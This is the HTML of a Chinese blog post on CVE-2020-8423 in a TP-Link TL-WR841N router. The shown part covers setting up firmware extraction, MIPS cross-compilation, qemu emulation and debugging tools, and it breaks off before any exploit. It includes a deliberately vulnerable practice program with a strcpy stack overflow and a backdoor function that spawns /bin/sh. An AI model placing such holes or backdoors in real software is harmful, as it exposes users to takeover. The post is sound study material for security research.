@@ -1,0 +1,949 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>我的技术与生活——CVE-2020-8423 | lonely is alwals</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <link rel="shortcut icon" href="/imgs/shortcut-icon.ico" type="image/x-icon">
+  <link rel="stylesheet" href="/css/public.css" />
+  <link rel="stylesheet" href="/css/layout.css" />
+  <link rel="stylesheet" href="/css/iconfont.css" />
+  <link rel="stylesheet" href="/css/APlayer.min.css" />
+  <script src="/js/APlayer.min.js"></script>
+  <script src="/js/jquery.min.js"></script>
+  <script src="/js/jquery.pjax.min.js"></script>
+
+  <script src='//unpkg.com/valine/dist/Valine.min.js'></script>
+  <script>
+    document.title = `我的技术与生活——CVE-2020-8423`
+  </script>
+<meta name="generator" content="Hexo 6.3.0">
+<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
+</head>
+
+<style>
+  .load {
+    width: 100%;
+    height: 100vh;
+    background-color: rgb(37, 35, 40);
+    display: flex;
+    flex-direction: column;
+    justify-content: center;
+    align-items: center;
+    position: relative;
+    z-index: 9999;
+  }
+  .load-circle {
+    width: 80px;
+    height: 80px;
+    border: 8px solid orange;
+    border-bottom-color: transparent;
+    border-radius: 50%;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    animation: rotate 1s linear infinite;
+    filter: drop-shadow(0 0 3px orange);
+  }
+  .load-circle-inner {
+    width: 40px;
+    height: 40px;
+    border: 8px solid orange;
+    border-top-color: transparent;
+    border-radius: 50%;
+    animation: rotate-reverse .5s linear infinite;
+  }
+  .load-text {
+    margin-top: 20px;
+    font-size: 24px;
+    color: orange;
+    display: flex;
+  }
+  .load-text span {
+    margin: 0 5px;
+    text-shadow: 5px 5px 5px orange;
+    animation: move 1s linear infinite;
+  }
+  .load-text span:nth-child(1) {
+    animation-delay: -0.6s;
+  }
+  .load-text span:nth-child(2) {
+    animation-delay: -0.5s;
+  }
+  .load-text span:nth-child(3) {
+    animation-delay: -0.4s;
+  }
+  .load-text span:nth-child(4) {
+    animation-delay: -0.3s;
+  }
+  .load-text span:nth-child(5) {
+    animation-delay: -0.2s;
+  }
+  .load-text span:nth-child(6) {
+    animation-delay: -0.1s;
+  }
+  @keyframes rotate {
+    0% { transform: rotate(0); }
+    100% { transform: rotate(360deg); }
+  }
+  @keyframes rotate-reverse {
+    0% { transform: rotate(0); }
+    100% { transform: rotate(-360deg); }
+  }
+  @keyframes move {
+    0% { transform: translateY(0%) rotate(0) scale(1); }
+    20% { transform: translateY(20%) rotate(10deg) scale(1.2); }
+    80% { transform: translateY(-10%) rotate(-20deg) scale(.8);}
+    100% { transform: translateY(0) rotate(0) scale(1); }
+  }
+
+  .progress {
+    position: fixed;
+    left: 0; top: 0;
+    width: 0;
+    height: 3px;
+    background-color: green;
+    transition: all cubic-bezier(0.215, 0.610, 0.355, 1) .1s;
+    z-index: 9999;
+  }
+
+  .to-up {
+    animation: toUp .5s 1;
+  }
+  .gray {
+    position: fixed;
+    left: 0;
+    top: 0;
+    width: 100%;
+    height: 100vh;
+    z-index: 9999;
+    display: none;
+    pointer-events: none;
+    background-color: #000;
+    mix-blend-mode: color;
+  }
+  @keyframes toUp {
+    from { transform: translateY(15px); opacity: 0; }
+    to { transform: translateY(0) ; opacity: 1; }
+  }
+</style>
+<body>
+  <div id="load" class="load">
+    <div class="load-circle">
+      <div class="load-circle-inner"></div>
+    </div>
+    <p class="load-text">
+      <span>L</span>
+      <span>O</span>
+      <span>A</span>
+      <span>D</span>
+      <span>I</span>
+      <span>N</span>
+      <span>G</span>
+    </p>
+  </div>
+  <div id="container" class="container w-100 vh-100" style="display: none;">
+    <header class="header">
+  <div class="header-wrapper">
+    <div class="header-left">
+      <div class="header-search">
+        <input id="search-input" type="text" class="header-search--input" placeholder="请输入要检索的文章标题" />
+        <span id="search-btn" class="header-search--icon"><i class="iconfont icon-sousuo"></i></span>
+      </div>
+      <div id="search-layer" class="header-search--layer hidden">
+        <p class="title">
+          <span>以下是搜索内容：</span>
+          <span id="close-layer-btn">关闭</span>
+        </p>
+        <ul>
+        </ul>
+      </div>
+    </div>
+    <div class="header-right">
+      <ul class="header-menu">
+        <li>
+          <a href="https://github.com/degial/">
+            <i class="header-menu--icon iconfont icon-shouye"></i>
+            <span class="header-menu--span">首页</span>
+          </a>
+        </li>
+        <li>
+          <a href="https://github.com/degial/log">
+            <i class="header-menu--icon iconfont icon-rizhi"></i>
+            <span class="header-menu--span">日志</span>
+          </a>
+        </li>
+        <li>
+          <a href="https://github.com/degial/link">
+            <i class="header-menu--icon iconfont icon-youqinglianjie"></i>
+            <span class="header-menu--span">友情链接</span>
+          </a>
+        </li>
+        <li>
+          <a href="https://github.com/degial/about">
+            <i class="header-menu--icon iconfont icon-guanyuwomen"></i>
+            <span class="header-menu--span">关于我</span>
+          </a>
+        </li>
+      </ul>
+    </div>
+  </div>
+</header>
+
+<script>
+  const ipt = document.querySelector('#search-input')
+  const btn = document.querySelector('#search-btn')
+  const layer = document.querySelector('#search-layer')
+  const posts = JSON.parse(`[{"title":"ACTF_2019_OneRepeater","path":"/posts/319d974/"},{"title":"GUESS","path":"/posts/c587cd26/"},{"title":"ACTF_2019_message","path":"/posts/f5d1b033/"},{"title":"SWPUCTF_2019_login","path":"/posts/61db3fed/"},{"title":"b00ks","path":"/posts/be955ceb/"},{"title":"b0verfl0w","path":"/posts/b656e51/"},{"title":"babyheap_0ctf_2017","path":"/posts/1a2f921f/"},{"title":"bad","path":"/posts/822b39fb/"},{"title":"bbctf_2020_write","path":"/posts/75171fcc/"},{"title":"checkin","path":"/posts/e1631c91/"},{"title":"ciscn_2019_c_5","path":"/posts/eeb50a42/"},{"title":"ciscn_2019_es_1","path":"/posts/90ce1974/"},{"title":"ciscn_2019_es_7","path":"/posts/79adbc41/"},{"title":"ciscn_final_2","path":"/posts/9a3dca0e/"},{"title":"ciscn_final_5","path":"/posts/4595fad/"},{"title":"ciscn_pwn","path":"/posts/344ab8fb/"},{"title":"easyshell","path":"/posts/9ea1a33f/"},{"title":"glibc","path":"/posts/58b6dd93/"},{"title":"gostack","path":"/posts/ad559ced/"},{"title":"heap","path":"/posts/bd2922e1/"},{"title":"heapcreator","path":"/posts/707c38cf/"},{"title":"hitcon2014_stkof","path":"/posts/78860fdf/"},{"title":"NewStar","path":"/posts/d23e595a/"},{"title":"200~house_of_force","path":"/posts/a8db7475/"},{"title":"ciscn_2019_c_3","path":"/posts/7d6af77/"},{"title":"","path":"/posts/0/"},{"title":"SWPUCTF_2019_p1KkHeap","path":"/posts/a25249b0/"},{"title":"inndy_rop","path":"/posts/19fdcc0c/"},{"title":"jiandan_pwn1","path":"/posts/595198b9/"},{"title":"lctf2016_pwn200","path":"/posts/6f5f7bb7/"},{"title":"freenote_x64","path":"/posts/231495d9/"},{"title":"mergeheap","path":"/posts/709727a2/"},{"title":"metasequoia_2020_samsara","path":"/posts/dff3306c/"},{"title":"note2","path":"/posts/c0d78a/"},{"title":"","path":"/posts/0/"},{"title":"overlapping_chunks","path":"/posts/37a70f1c/"},{"title":"pstack","path":"/posts/3d6a2015/"},{"title":"","path":"/posts/0/"},{"title":"python课设","path":"/posts/5eca8ee9/"},{"title":"qwnt2024","path":"/posts/a036fd99/"},{"title":"roarctf_2019_easypwn","path":"/posts/29aca647/"},{"title":"sctf2019_easy_heap","path":"/posts/b5a0cf5/"},{"title":"sctf_2019_easy_heap","path":"/posts/afe33925/"},{"title":"sleepyHolder_hitcon_2016","path":"/posts/b1e92899/"},{"title":"starctf_2019_girlfriend","path":"/posts/2672e039/"},{"title":"stdout","path":"/posts/c2c94c1c/"},{"title":"STKOF","path":"/posts/696f0fbd/"},{"title":"level4","path":"/posts/7792b02a/"},{"title":"login","path":"/posts/aa08cb10/"},{"title":"","path":"/posts/0/"},{"title":"解决libc6软件包和libc6-dev不匹配的问题","path":"/posts/24332419/"},{"title":"武功论剑","path":"/posts/6ca732a0/"},{"title":"trick","path":"/posts/d8f0a91e/"},{"title":"xpdf","path":"/posts/7e7e55f1/"},{"title":"CVE-2020-8423","path":"/posts/24932e9/"},{"title":"沙箱","path":"/posts/fbdf783e/"},{"title":"trick","path":"/posts/d8f0a91e/"}]`)
+  ipt.addEventListener('keyup', e => {
+    if (e.key === 'Enter') {
+      handleSearch()
+    }
+  })
+  btn.addEventListener('click', () => {
+    handleSearch()
+  })
+
+  document.querySelector('#close-layer-btn').addEventListener('click', () => {
+    layer.classList.toggle('hidden')
+  })
+
+  function handleSearch() {
+    if (ipt.value.trim() === '') {
+      return
+    }
+    let html = ''
+    const targetPosts = posts.filter(post => post.title.includes(ipt.value))
+    targetPosts.forEach(post => {
+      html += `
+        <li>
+          <div>
+            <a href="/${post.path}">${post.title.replace(new RegExp(ipt.value), `<span>${ipt.value}</span>`)}</a>
+          </div>
+          <img src="${post.cover || '/imgs/default-cover.webp' }" />
+        </li>
+      `
+    })
+    if (html.trim () === '') {
+      html += '<p class="empty">没有搜索到内容</p>'
+    }
+    layer.querySelector('ul').innerHTML = html
+    layer.classList.remove('hidden')
+  }
+</script> 
+    <section id="main" class="main">
+      <div class="main-left-wrapper">
+<div class="main-left">
+  <div class="main-left--block">
+    <div class="main-left--info">
+      <img src="/imgs/avatar.jpg"" class="main-left--avatar" />
+      <div class="main-left--intro">
+        <p class="main-left--name">pa1n</p>
+        <div class="main-left--tags">
+          <span class="main-left--tag">longely</span>
+          <span class="main-left--tag">sad</span>
+        </div>
+      </div>
+    </div>
+  
+    <div>
+      <div class="main-left--motto">
+        <p>“花有重开日，人无再少年”</p>
+        <p>“一个简单普通的男孩”</p>
+      </div>
+      <div class="main-left--github">
+        <span class="line"></span>
+        <a href="https://github.com/Aizener"><i class="logo iconfont icon-github-fill"></i></a>
+        <span class="line"></span>
+      </div>
+      <div class="main-left--statics">
+        <a href="/categories">
+          <div>
+            <span>0</span>
+            <span>分类</span>
+          </div>
+        </a>
+        <a href="/tags">
+          <div>
+            <span>2</span>
+            <span>标签</span>
+          </div>
+        </a>
+        <a href="/archives">
+          <div>
+            <span>12 </span>
+            <span>归档</span>
+          </div>
+        </a>
+      </div>
+    </div>
+  </div>
+
+  <div class="main-left--block">
+    <ul class="main-left--menu">
+      
+        <li>
+          <a href="/">
+            <span class="header-menu--span">小站首页</span>
+            <i class="header-menu--icon iconfont icon-shouye"></i>
+          </a>
+        </li>
+      
+        <li>
+          <a href="/log">
+            <span class="header-menu--span">个人日志</span>
+            <i class="header-menu--icon iconfont icon-rizhi"></i>
+          </a>
+        </li>
+      
+        <li>
+          <a href="/link">
+            <span class="header-menu--span">友情链接</span>
+            <i class="header-menu--icon iconfont icon-youqinglianjie"></i>
+          </a>
+        </li>
+      
+        <li>
+          <a href="/about">
+            <span class="header-menu--span">关于自己</span>
+            <i class="header-menu--icon iconfont icon-guanyuwomen"></i>
+          </a>
+        </li>
+      
+        <li>
+          <a href="/tools">
+            <span class="header-menu--span">我的工具</span>
+            <i class="header-menu--icon iconfont icon-gongju"></i>
+          </a>
+        </li>
+      
+    </ul>
+  </div>
+
+  <div class="main-left--block">
+    <div class="main-left--site">
+      <h5 class="main-left--title">
+        <span>站点信息</span>
+        <i class="iconfont icon-zhandian"></i>
+      </h5>
+      <p class="main-left--subtitle">
+        <span>文章数目：</span>
+        <span>57 篇</span>
+      </p>
+      <p class="main-left--subtitle">
+        <span>最近动态：</span>
+        <span>今天</span>
+      </p>
+      <p class="main-left--subtitle">
+        <span>上线时间：</span>
+        <span>1033天</span>
+      </p>
+      <p class="main-left--subtitle">
+        <span>当前版本：</span>
+        <span>v1.0.2</span>
+      </p>
+    </div>
+  </div>
+</div></div>
+      <div id="main-container" class="main-container">
+
+
+  <link rel="stylesheet" href="/css/partial/article.css" />
+
+<div class="article-container">
+  <div class="article">
+    <h1 class="article-title">CVE-2020-8423</h1>
+    <div class="article-info">
+      <div class="article-info--item">
+        <div class="article-info--info">
+          
+          <div class="article-info--categories">
+            <span>分类：</span>
+            
+          </div>
+          
+          
+          <div class="article-info--tags">
+            <span>标签：</span>
+            
+          </div>
+          
+          <p class="article-info--date">日期：2024-11-27 16:42:43</p>
+        </div>
+        <img src="/imgs/default-cover.webp" alt="" class="article-cover">
+      </div>
+    </div>
+    <article class="article-content markdown-body">
+      <p> 漏洞编号：CVE-2020-8423</p>
+<p>固件地址： <a target="_blank" rel="noopener" href="https://www.tp-link.com/no/support/download/tl-wr841n/v10/">https://www.tp-link.com/no/support/download/tl-wr841n/v10/</a></p>
+<p><img src="C:/Users/23633/AppData/Roaming/Typora/typora-user-images/image-20241127164755571.png" alt="image-20241127164755571"></p>
+<h5 id="工具安装"><a href="#工具安装" class="headerlink" title="工具安装"></a>工具安装</h5><p>安装binwalk</p>
+<figure class="highlight py"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt update</span><br><span class="line">sudo apt-get install binwalk</span><br></pre></td></tr></tbody></table></figure>
+<p>SquashFS:用于Linux内核的只读文件系统</p>
+<figure class="highlight py"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install zlib1g-dev liblzma-dev liblzo2-dev</span><br><span class="line">sudo git clone https://github.com/devttys0/sasquatch  </span><br><span class="line"><span class="comment"># 没有代理的话  git clone https://gitee.com/yixuan1/sasquatch.git </span></span><br><span class="line">cd sasquatch &amp;&amp; sudo ./build.sh</span><br></pre></td></tr></tbody></table></figure>
+<p>qemu安装</p>
+<figure class="highlight py"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install qemu</span><br></pre></td></tr></tbody></table></figure>
+<p>交叉编译环境buildroot</p>
+<figure class="highlight py"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install libncurses5-dev patch</span><br><span class="line">wget http://buildroot.uclibc.org/downloads/snapshots/buildroot-snapshot.tar.bz2</span><br><span class="line">tar -jxvf buildroot-snapshot.tar.bz2</span><br><span class="line">cd buildroot/</span><br><span class="line">make clean</span><br><span class="line">make menuconfig</span><br><span class="line">sudo make</span><br></pre></td></tr></tbody></table></figure>
+<p>进入menuconfig后，选择目标架构Mips32</p>
+<p><img src="https://hswikar.oss-cn-beijing.aliyuncs.com/image-20241127183404405.png" alt="image-20241127183404405"></p>
+<p>安装完后设置环境变量，再/etc/profile结尾加上</p>
+<figure class="highlight py"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">export PATH=$PATH:$HOME/buildroot/output/host/<span class="built_in">bin</span></span><br></pre></td></tr></tbody></table></figure>
+<p>编译第一个mips程序</p>
+<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">backdoor</span><span class="params">()</span>{</span><br><span class="line">     system(<span class="string">"/bin/sh"</span>);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">has_stack</span><span class="params">(<span class="type">char</span> *src)</span></span><br><span class="line">{</span><br><span class="line">     <span class="type">char</span> dst[<span class="number">20</span>]={<span class="number">0</span>};</span><br><span class="line">     <span class="built_in">strcpy</span>(dst,src);</span><br><span class="line">     <span class="built_in">printf</span>(<span class="string">"copy successfully"</span>);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc,<span class="type">char</span> *argv[])</span></span><br><span class="line">{</span><br><span class="line">     has_stack(argv[<span class="number">1</span>]);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
+<p>默认编译小端序程序，注意要加<strong>-static</strong> 静态编译，因为qemu运行环境里没包含c标准库</p>
+<figure class="highlight sh"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mipsel-linux-gcc vuln.c -o vuln -static</span><br><span class="line">file vuln</span><br></pre></td></tr></tbody></table></figure>
+<p><img src="https://hswikar.oss-cn-beijing.aliyuncs.com/image-20241127220720093.png" alt="image-20241127220720093"></p>
+<p>编译大端程序，需要加-EB参数,但是仅仅加-EB会导致ld报错，所以要编译和链接分开</p>
+<figure class="highlight py"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mipsel-linux-gcc -EB -c -static  vuln.c -o vuln.o </span><br><span class="line">mipsel-linux-ld vuln.o -EB -o vuln</span><br></pre></td></tr></tbody></table></figure>
+<p>但我还是报错了</p>
+<figure class="highlight py"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">hpp@swikar:~$ mipsel-linux-gcc -EB -c -static  vuln.c -o vuln.o </span><br><span class="line">hpp@swikar:~$ mipsel-linux-ld vuln.o -EB -o vuln</span><br><span class="line">mipsel-linux-ld: warning: cannot find entry symbol __start; defaulting to 00400110</span><br><span class="line">mipsel-linux-ld: vuln.o: <span class="keyword">in</span> function `backdoo<span class="string">r':</span></span><br><span class="line"><span class="string">vuln.c:(.text+0x24): undefined reference to `system'</span></span><br><span class="line">mipsel-linux-ld: vuln.c:(.text+<span class="number">0x2c</span>): undefined reference to `system<span class="string">'</span></span><br><span class="line"><span class="string">mipsel-linux-ld: vuln.o: in function `has_stack'</span>:</span><br><span class="line">vuln.c:(.text+<span class="number">0x74</span>): undefined reference to `__stack_chk_guard<span class="string">'</span></span><br><span class="line"><span class="string">mipsel-linux-ld: vuln.c:(.text+0xa0): undefined reference to `strcpy'</span></span><br><span class="line">mipsel-linux-ld: vuln.c:(.text+<span class="number">0xa8</span>): undefined reference to `strcpy<span class="string">'</span></span><br><span class="line"><span class="string">mipsel-linux-ld: vuln.c:(.text+0xbc): undefined reference to `printf'</span></span><br><span class="line">mipsel-linux-ld: vuln.c:(.text+<span class="number">0xc4</span>): undefined reference to `<span class="built_in">print</span><span class="string">f'</span></span><br><span class="line"><span class="string">mipsel-linux-ld: vuln.c:(.text+0xd4): undefined reference to `__stack_chk_guard'</span></span><br><span class="line">mipsel-linux-ld: vuln.c:(.text+<span class="number">0xe8</span>): undefined reference to `__stack_chk_fail<span class="string">'</span></span><br></pre></td></tr></tbody></table></figure>
+<p>用工具链安装mips编译环境</p>
+<figure class="highlight py"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install linux-libc-dev-mipsel-cross</span><br><span class="line">sudo apt-get install libc6-mipsel-cross libc6-dev-mipsel-cross</span><br><span class="line">sudo apt-get install binutils-mipsel-linux-gnu</span><br><span class="line"><span class="comment">#我这里用的是版本是10，mipsel-linux-gnu-gcc和mips-linux-gnu-gcc分别是是下面两个包的一部分</span></span><br><span class="line">sudo apt-get install gcc-${VERSION}-mipsel-linux-gnu g++-${VERSION}-mips-linux-gnu </span><br></pre></td></tr></tbody></table></figure>
+<p>mipsel-linux-gnu-gcc说找不到，需要创建符号链接</p>
+<figure class="highlight py"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo ln -s /usr/<span class="built_in">bin</span>/mipsel-linux-gnu-gcc-<span class="number">10</span> /usr/<span class="built_in">bin</span>/mipsel-linux-gnu-gcc</span><br></pre></td></tr></tbody></table></figure>
+<p><img src="https://hswikar.oss-cn-beijing.aliyuncs.com/image-20241128001006442.png" alt="image-20241128001006442"></p>
+<p>用mips-linux-gnu-gcc编译大端序</p>
+<figure class="highlight py"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$mips-linux-gnu-gcc vuln.c -o vuln -static</span><br><span class="line">$ file vuln</span><br><span class="line">vuln: ELF <span class="number">32</span>-bit MSB executable, MIPS, MIPS32 rel2 version <span class="number">1</span> (SYSV), statically linked, BuildID[sha1]=5608d962ff3f4b40b36c9d67a82dfa1f4275ad07, <span class="keyword">for</span> GNU/Linux <span class="number">3.2</span><span class="number">.0</span>, <span class="keyword">not</span> stripped</span><br></pre></td></tr></tbody></table></figure>
+<p>安装qemu-user</p>
+<figure class="highlight py"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$sudo apt install qemu-user</span><br><span class="line">$qemu-mipsel vuln <span class="string">"123"</span></span><br><span class="line">copy successfully</span><br></pre></td></tr></tbody></table></figure>
+<p>qemu运行Mips Linux内核</p>
+<p><a target="_blank" rel="noopener" href="https://people.debian.org/~aurel32/qemu/mips/在这里下载包">https://people.debian.org/~aurel32/qemu/mips/在这里下载包</a></p>
+<figure class="highlight py"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wget https://people.debian.org/~aurel32/qemu/mips/vmlinux-<span class="number">3.2</span><span class="number">.0</span>-<span class="number">4</span>-4kc-malta</span><br><span class="line">wget https://people.debian.org/~aurel32/qemu/mips/debian_squeeze_mips_standard.qcow2</span><br></pre></td></tr></tbody></table></figure>
+<p>用qemu运行mips debian,账号密码都是root</p>
+<p>qemu有主要如下两种运作模式，User Mode和System Mode</p>
+<p>安装qemu-system-mips</p>
+<figure class="highlight py"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt update</span><br><span class="line">sudo apt-get install qemu-system-mips</span><br></pre></td></tr></tbody></table></figure>
+<p>qemu的几个系统命令</p>
+<p><img src="https://hswikar.oss-cn-beijing.aliyuncs.com/t012dd195f031df4f23.png" alt="img"></p>
+<figure class="highlight py"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo qemu-system-mips -M malta -kernel $HOME/vmlinux-<span class="number">3.2</span><span class="number">.0</span>-<span class="number">4</span>-4kc-malta -hda $HOME/debian_squeeze_mips_standard.qcow2 -append <span class="string">"root=/dev/sdal console=tty0"</span> -net nic,macaddr=<span class="number">00</span>:0c:<span class="number">29</span>:ee:<span class="number">39</span>:<span class="number">39</span> -net tap -nographic</span><br></pre></td></tr></tbody></table></figure>
+<p>登录成功</p>
+<p><img src="https://hswikar.oss-cn-beijing.aliyuncs.com/image-20241128003759344.png" alt="image-20241128003759344"></p>
+<p>安装<strong>Gdb-Multiarch</strong>，能够调试多个架构（包括mips）的gdb调试工具</p>
+<figure class="highlight py"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install gdb-multiarch</span><br></pre></td></tr></tbody></table></figure>
+<p>安装peda插件</p>
+<figure class="highlight py"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/longld/peda.git ~/peda</span><br><span class="line">echo <span class="string">"source ~/peda/peda.py"</span> &gt;&gt; ~/.gdbinit</span><br></pre></td></tr></tbody></table></figure>
+<p>把 <strong>vim ~/.gdbinit</strong> 改为pwndbg的</p>
+<p>gdbserver(mips)</p>
+<figure class="highlight py"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/rapid7/embedded-tools.git</span><br><span class="line">git clone https://github.com/hugsy/gdb-static</span><br><span class="line">git cloen https://github.com/akpotter/embedded-toolkit</span><br></pre></td></tr></tbody></table></figure>
+<p>测试</p>
+<figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">mipsel-linux-gnu-gcc vuln.c -o vuln -static</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">qemu-mipsel -g 9000 vuln</span></span><br></pre></td></tr></tbody></table></figure>
+<figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">gdb-multiarch -q</span></span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">file vuln</span></span><br><span class="line">Reading symbols from vuln...</span><br><span class="line">(No debugging symbols found in vuln)</span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">target remote 127.0.0.1:9000</span></span><br><span class="line">Remote debugging using 127.0.0.1:9000</span><br></pre></td></tr></tbody></table></figure>
+<p>成功</p>
+<p><img src="https://hswikar.oss-cn-beijing.aliyuncs.com/image-20241128171738997.png" alt="image-20241128171738997"></p>
+<p><strong>ROPgadget</strong> 源码安装</p>
+<figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/JonathanSalwan/ROPgadget.git &amp;&amp; cd ROPgadget</span><br><span class="line">sudo apt install python3-pip</span><br><span class="line">sudo -H python3 -m pip install capstone</span><br><span class="line">sudo -H python3 setup.py install</span><br></pre></td></tr></tbody></table></figure>
+<p>安装wireshark</p>
+<figure class="highlight py"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo add-apt-repository ppa:wireshark-dev/stable</span><br><span class="line">sudo apt install -y wireshark</span><br><span class="line">sudo usermod -aG wireshark $USER</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>
+<p>安装Mipsrop</p>
+<figure class="highlight py"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/tacnetsol/ida/blob/master/plugins/mipsrop/mipsrop.py</span><br><span class="line">https://github.com/SeHwa/mipsrop-<span class="keyword">for</span>-ida7</span><br></pre></td></tr></tbody></table></figure>
+<h5 id="配置运行环境"><a href="#配置运行环境" class="headerlink" title="配置运行环境"></a><strong>配置运行环境</strong></h5><p>用qemu来模拟路由器</p>
+<figure class="highlight py"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">binwalk -Me TL-WR841N_V10_150310.<span class="built_in">zip</span></span><br><span class="line">cd _TL-WR841N_V10_150310.<span class="built_in">zip</span>.extracted/_wr841nv10_wr841ndv10_en_3_16_9_up_boot\(<span class="number">150310</span>\).<span class="built_in">bin</span>.extracted/squashfs-root/</span><br></pre></td></tr></tbody></table></figure>
+<p>安装gdb7</p>
+<p>注释掉这几个文件的这个函数</p>
+<p><img src="https://hswikar.oss-cn-beijing.aliyuncs.com/image-20241210194031559.png" alt="image-20241210194031559"></p>
+<p><strong>配置桥接</strong></p>
+<p> <strong>这里本人遇到了很多坑 ：（</strong></p>
+<p>将文件系统传入虚拟机中运行固件，为了能让qemu和虚拟机传输文件，先配置桥接网络</p>
+<p><strong>1.配置桥接网卡</strong></p>
+<p>安装bridge-utils和uml-utilities</p>
+<figure class="highlight py"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get  install bridge-utils</span><br><span class="line">sudo apt-get install uml-utilities</span><br></pre></td></tr></tbody></table></figure>
+<p>修改 <strong>/etc/network/interfacces</strong> 来配置网络桥接</p>
+<p>以下是旧版本适用</p>
